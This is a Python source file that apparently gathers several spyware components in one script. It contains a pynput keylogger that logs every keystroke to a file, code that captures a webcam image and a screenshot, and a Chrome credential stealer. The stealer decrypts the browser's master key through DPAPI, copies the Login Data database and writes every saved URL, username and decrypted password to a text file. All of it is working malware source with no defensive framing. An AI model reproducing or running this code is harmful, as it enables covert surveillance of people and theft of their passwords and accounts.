# ---------------Keylogger---------------
from pynput.keyboard import Listener

special_keys = {
    "Key.alt": "[Alt]",
    "Key.alt_gr": "[AltGr]",
    "Key.alt_l": "[AltL]",
    "Key.alt_r": "[AltR]",
    "Key.backspace": "[Backspace]",
    "Key.caps_lock": "[CapsLock]",
    "Key.cmd": "[Win]",
    "Key.cmd_r": "[WinR]",
    "Key.ctrl": "[Ctrl]",
    "Key.ctrl_l": "[CtrlL]",
    "Key.ctrl_r": "[CtrlR]",
    "Key.delete": "[Delete]",
    "Key.down": "[Down]",
    "Key.end": "[End]",
    "Key.enter": "[Enter]",
    "Key.esc": "[Escape]",
    "Key.f1": "[F1]",
    "Key.f2": "[F2]",
    "Key.f3": "[F3]",
    "Key.f4": "[F4]",
    "Key.f5": "[F5]",
    "Key.f6": "[F6]",
    "Key.f7": "[F7]",
    "Key.f8": "[F8]",
    "Key.f9": "[F9]",
    "Key.f10": "[F10]",
    "Key.f11": "[F11]",
    "Key.f12": "[F12]",
    "Key.f13": "[F13]",
    "Key.f14": "[F14]",
    "Key.f15": "[F15]",
    "Key.f16": "[F16]",
    "Key.f17": "[F17]",
    "Key.f18": "[F18]",
    "Key.f19": "[F19]",
    "Key.f20": "[F20]",
    "Key.f21": "[F21]",
    "Key.f22": "[F22]",
    "Key.f23": "[F23]",
    "Key.f24": "[F24]",
    "Key.home": "[Home]",
    "Key.insert": "[Insert]",
    "Key.left": "[Left]",
    "Key.media_next": "[MediaNext]",
    "Key.media_play_pause": "[MediaPlayPause]",
    "Key.media_previous": "[MediaPrev]",
    "Key.media_stop": "[MediaStop]",
    "Key.media_volume_down": "[VolDown]",
    "Key.media_volume_mute": "[Mute]",
    "Key.media_volume_up": "[VolUp]",
    "Key.menu": "[Menu]",
    "Key.num_lock": "[NumLock]",
    "Key.page_down": "[PageDown]",
    "Key.page_up": "[PageUp]",
    "Key.pause": "[Pause]",
    "Key.print_screen": "[PrintScreen]",
    "Key.right": "[Right]",
    "Key.scroll_lock": "[ScrollLock]",
    "Key.shift": "[Shift]",
    "Key.shift_r": "[ShiftR]",
    "Key.space": "[Space]",
    "Key.tab": "[Tab]",
    "Key.up": "[Up]",
    "<96>": "0",      # Numpad 0
    "<97>": "1",      # Numpad 1
    "<98>": "2",      # Numpad 2
    "<99>": "3",      # Numpad 3
    "<100>": "4",     # Numpad 4
    "<101>": "5",     # Numpad 5
    "<102>": "6",     # Numpad 6
    "<103>": "7",     # Numpad 7
    "<104>": "8",     # Numpad 8
    "<105>": "9",     # Numpad 9
}

def on_key_down(key):
    listen = str(key).replace("'", "")
    if special_keys.get(listen):
        listen = special_keys[listen]
    with open("KL.txt", "a") as f:
        f.write(listen)

def on_key_up(key):
    if str(key) == "Key.esc":
        return False

with Listener(on_press=on_key_down, on_release=on_key_up) as listener:
    listener.join()


# ---------------Webcam---------------

import cv2
camera = cv2.VideoCapture(0)
ret, frame = camera.read()
if ret:
    cv2.imwrite("webcam.png", frame)

camera.release()
cv2.destroyAllWindows()

# ---------------ScreenShot---------------

import pyautogui
my_screenshot = pyautogui.screenshot()
my_screenshot.save("screenshot.png")


# ---------------ChromePasswordCapture---------------

import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES

def pass_decryption(password, encryption_key) :
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        return "No Password"

file_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Local State"

with open(file_path, 'r', encoding="utf-8") as f:
    py_data = json.loads(f.read())

encryption_key = base64.b64decode(py_data["os_crypt"]["encrypted_key"])[5:]
key = win32crypt.CryptUnprotectData(encryption_key)[1]
print("Key extracted successfully:", key.hex())

db_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
file_name = "chrome_passwords.db"
shutil.copyfile(db_path, file_name)
db = sqlite3.connect(file_name)
cursor = db.cursor()
cursor.execute("select origin_url, action_url, username_value, password_value from logins order by date_last_used")
with open("chrome_passwords.txt", "w", encoding="utf-8") as pf:
    for row in cursor.fetchall():
        main_url = row[0]
        login_url = row[1]
        username = row[2]
        password = pass_decryption(row[3], key)
        if username or password:
            pf.write(f"main_url: {main_url}\n")
            pf.write(f"login_url: {login_url}\n")
            pf.write(f"user_name: {username}\n")
            pf.write(f"password: {password}\n")
            pf.write("-" * 40 + "\n")
cursor.close()
db.close()
os.remove(file_name)